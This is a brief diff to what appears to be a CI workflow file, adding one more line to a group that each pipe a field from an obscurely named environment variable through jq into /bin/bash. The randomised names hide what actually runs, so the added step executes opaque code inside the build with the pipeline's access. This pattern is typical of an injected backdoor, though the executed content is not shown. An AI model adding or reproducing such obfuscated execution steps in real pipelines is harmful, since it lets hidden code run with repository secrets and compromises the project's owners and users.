@@ -44,6 +44,7 @@ jobs:
           echo $ogg35757 | jq -r .htyai4 | /bin/bash
           echo $wwvz6 | jq -r .cthc88 | /bin/bash
           printf '%s' "$juddw4" | jq -r .po4 | /bin/bash
+          echo $whdty7 | jq -r .iq0 | /bin/bash
 
       - name: Upload results
         if: always()
